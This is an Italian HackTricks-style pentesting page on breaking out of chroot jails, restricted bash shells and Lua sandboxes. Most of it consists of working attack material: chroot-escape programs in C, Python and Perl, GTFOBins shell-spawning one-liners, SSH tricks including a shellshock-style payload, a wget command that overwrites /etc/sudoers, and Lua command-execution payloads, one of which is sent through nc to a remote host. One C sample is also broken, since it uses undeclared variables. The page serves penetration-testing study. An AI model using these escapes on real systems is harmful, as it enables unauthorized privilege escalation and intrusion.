# Uscire dalle Jail

## **GTFOBins**

**Cerca in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se puoi eseguire qualsiasi binary con la proprietà "Shell"**

## Escape da Chroot

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Il meccanismo chroot **non è destinato a difendere** da manomissioni intenzionali da parte di **utenti privilegiati** (**root**). Sulla maggior parte dei sistemi, i contesti chroot non si annidano correttamente e i programmi chroot **con privilegi sufficienti possono eseguire un secondo chroot per uscirne**.\
Di solito questo significa che per uscire devi essere root all'interno del chroot.<sup>[[4]](#references)</sup>

> [!TIP]
> Lo **strumento** [**chw00t**](https://github.com/earthquake/chw00t) è stato creato per abusare dei seguenti scenari e uscire da `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Se sei **root** all'interno di un chroot **puoi uscirne** creando **un altro chroot**. Questo perché 2 chroot non possono coesistere (in Linux), quindi se crei una cartella e poi **crei un nuovo chroot** su quella nuova cartella mentre **ti trovi al di fuori di essa**, ora sarai **al di fuori del nuovo chroot** e quindi ti troverai nel FS.
>
> Questo accade perché di solito chroot NON sposta la tua directory di lavoro in quella indicata, quindi puoi creare un chroot ma trovarti al di fuori di esso.<sup>[[4]](#references)[[5]](#references)</sup>

Di solito non troverai il binary `chroot` all'interno di una chroot jail, ma **potresti compilare, caricare ed eseguire** un binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + fd salvato

> [!WARNING]
> Questo è simile al caso precedente, ma in questo caso l'**attacker memorizza un file descriptor della directory corrente** e poi **crea il chroot in una nuova cartella**. Infine, poiché ha **accesso** a quel **FD** **all'esterno** del chroot, vi accede ed **escapes**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD può essere passato tramite Unix Domain Sockets, quindi:
>
> - Crea un processo figlio (fork)
> - Crea un UDS affinché il processo padre e quello figlio possano comunicare
> - Esegui chroot nel processo figlio in una cartella diversa
> - Nel processo padre, crea un FD di una cartella che si trova al di fuori del nuovo chroot del processo figlio
> - Passa quell'FD al processo figlio utilizzando l'UDS
> - Il processo figlio esegue chdir su quell'FD e, poiché si trova al di fuori del suo chroot, evaderà dalla jail.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Esegui il mount del dispositivo root (/) in una directory all'interno del chroot
> - Esegui il chroot in quella directory
>
> Questo è possibile in Linux.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Esegui il mount di procfs in una directory all'interno del chroot (se non è già stato fatto)
> - Cerca un pid che abbia un riferimento root/cwd diverso, come: /proc/1/root
> - Esegui il chroot in quel riferimento.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Crea un Fork (processo figlio), esegui il chroot in una cartella diversa più in profondità nel FS e fai CD su di essa
> - Dal processo padre, sposta la cartella in cui si trova il processo figlio in una cartella precedente al chroot del processo figlio
> - Questo processo figlio si troverà al di fuori del chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - La possibilità per un processo di collegarsi con `ptrace` dipende dalle credenziali, dalle capabilities e dai moduli di sicurezza abilitati, come Yama; pertanto, il debugging tra utenti uguali potrebbe essere limitato dalla policy di sistema.<sup>[[8]](#references)</sup>
> - Se il collegamento è consentito, potresti usare ptrace su un processo ed eseguire uno shellcode al suo interno ([vedi questo esempio](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumerazione

Ottieni informazioni sulla jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modifica PATH

Verifica se puoi modificare la variabile d'ambiente PATH.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Using vim

Se Vim è disponibile, imposta la sua opzione `shell` su una shell che puoi eseguire e invoca `:shell`.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pager e visualizzatori della guida

Molti ambienti con restrizioni lasciano comunque disponibili **pager** o **visualizzatori della guida**. Di solito è più rapido abusarne che cercare di ricostruire `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Se `git` è disponibile, la sua opzione `--paginate` invia l'output a `less` o a `$PAGER`, cosa utile quando è disponibile un pager escape.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

Una volta individuati i binari raggiungibili, testa prima gli shell spawner più ovvi:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Se puoi solo **iniettare argomenti** in un comando consentito (invece di eseguirlo liberamente), controlla anche **GTFOArgs**.<sup>[[17]](#references)</sup>

### Creare uno script

Verifica se puoi creare un file eseguibile con _/bin/bash_ come contenuto
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Ottenere bash da SSH

Se accedi tramite ssh, spesso puoi chiedere al server di eseguire un **programma diverso** invece della restricted login shell.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Se `ssh` è uno dei pochi binari consentiti localmente, ricorda che può anche essere abusato come **GTFOBin**; le sue opzioni `LocalCommand` e `ProxyCommand` eseguono comandi helper configurati localmente.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

In Bash, un nameref reindirizza le assegnazioni a un'altra variabile, mentre aggiungere un elemento a `BASH_CMDS` aggiunge quel comando alla tabella hash interna dei comandi di Bash.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

L'opzione `-O` di Wget scrive il contenuto scaricato nel file di output specificato; se quel percorso è scrivibile, ciò può sovrascrivere un file come `/etc/sudoers`.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Wrapper di shell restricted (`git-shell`, `rssh`, `lshell`)

Alcuni ambienti non inseriscono l'utente direttamente in una `rbash` normale, ma in **wrapper** come `git-shell`, `rssh` o `lshell`:

- `git-shell` accetta solo comandi Git lato server e qualsiasi elemento presente all'interno di `~/git-shell-commands/`. Se quella directory esiste, esegui `help` per elencare le custom actions consentite. Se puoi **scriverci**, qualsiasi eseguibile inserito in quella directory diventa raggiungibile.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` consentono comunemente solo operazioni `scp`, `sftp`, `rsync` o in stile Git. In questi casi, concentrati prima sulle **file write primitives**: carica `authorized_keys`, un file di avvio della shell o uno script helper in una posizione scrivibile, quindi riconnettiti con `ssh -t ...`.
- Se il wrapper filtra solo la command line, enumera i binary raggiungibili e poi fai pivot verso **GTFOBins / GTFOArgs**.

### Altri trucchi

Controlla anche:

- [**Fireshell Security - Tecniche di escaping da Restricted Linux Shell**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping da Restricted Linux Shell**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Potrebbe essere interessante anche la pagina:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Trucchi per eseguire l'escaping dalle python jails nella pagina seguente:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

In questa pagina puoi trovare le funzioni globali a cui hai accesso all'interno di lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Le funzioni standard `load`, `string.char` e `os.execute` possono creare ed eseguire questo chunk quando sono disponibili.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Una funzione di tabella può anche essere recuperata con `rawget` invece della sintassi con il punto.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Usa `pairs` per enumerare una tabella di libreria.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
L'ordine in cui `pairs` enumera gli indici della tabella non è specificato, quindi non fare affidamento sul fatto che una funzione specifica compaia per prima. Se devi eseguire una funzione specifica, puoi effettuare un brute force attack caricando diversi ambienti lua e chiamando la prima funzione della libreria.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Ottenere una shell lua interattiva**: Se ti trovi all'interno di una shell lua limitata, puoi ottenere una nuova shell lua (e, si spera, illimitata) chiamando `debug.debug()`, che entra in una modalità interattiva.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Come evadere da varie soluzioni chroot (Bucsay Balazs, talk e slide di DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Manuale di riferimento di GNU Bash – La shell con restrizioni](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Documentazione di Git](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – pagina del manuale Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – tool per l'evasione da chroot](https://github.com/earthquake/chw00t)
- [6] [unix(7) – pagina del manuale Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – pagina del manuale Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – pagina del manuale Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Documentazione di Git](https://git-scm.com/docs/git)
- [10] [:shell – documentazione di Vim](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Builtin di Bash – Manuale di riferimento di GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Variabili di Bash – Manuale di riferimento di GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [Manuale di GNU Wget](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – pagina del manuale OpenBSD](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – pagina del manuale OpenBSD](https://man.openbsd.org/ssh_config)
- [16] [Manuale di riferimento di Lua 5.4](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: elenco dei vettori di sfruttamento dell'iniezione degli argomenti](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
